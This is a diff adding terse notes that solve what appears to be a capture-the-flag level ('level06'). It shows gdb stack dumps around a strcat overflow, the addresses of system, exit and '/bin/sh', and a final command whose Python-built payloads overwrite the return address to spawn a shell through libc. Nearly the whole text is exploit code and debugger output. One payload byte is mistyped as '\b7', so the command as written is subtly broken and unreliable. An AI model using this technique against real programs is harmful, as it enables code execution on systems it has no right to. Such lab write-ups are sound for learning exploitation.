@@ -1,0 +1,29 @@
+break before strcat
+	0x0804857e <+98>:	mov    %eax,(%esp)
+	0x08048581 <+101>:	call   0x80483d0 <strcat@plt
+
+r with sample 10*A and 10*B
+
+(gdb) x/50xw $esp	   |--------------------------------------- greet start	
+0xbffffb90:	0xb7ee7cc6 |0xbffffbf0	0xb7fefcf2	0xb7fffac0
+0xbffffba0:	0x6c6c6957<|0x6d6d6f6b	0x00206e65	0x00000000
+0xbffffbb0:	0x00000001	0x08048288	0x0804993c	0x00000000
+0xbffffbc0:	0xb7e75874	0xbffffc40	0x00000000	0xbffffc8c 
+0xbffffbd0:	0xbffffca8	0xb7ff59c0	0x00000002	0xb7ee7d10
+0xbffffbe0:	0xb7ee7d47	0x00000000	0xbffffca8	0x080486af < -- return adress
+
+0xbffffbf0:	0x41414141	0x41414141	0x00004141	0x00000000 < --|
+0xbffffc00:	0x00000000	0x00000000	0x00000000	0x00000000 < --| param greetuser
+0xbffffc10:	0x00000000	0x00000000	0x42424242	0x42424242 <-- |
+
+(gdb) find system,+9999999,"/bin/sh"
+0xb7faae94
+1 pattern found.
+(gdb) p exit
+$4 = {<text variable, no debug info>} 0xb7e9d270 <exit>
+(gdb) p system
+$5 = {<text variable, no debug info>} 0xb7ea9c30 <system>
+LANG=de_gb.US-UTF8
+
+$ ./level06 $(python -c 'print "\x70\xd2\xe9\xb7"+ "\x94\xae\xfa\b7" + "A"*32') $(python -c 'print "B"*25 + "\x30\x9c\xea\xb7"')
+
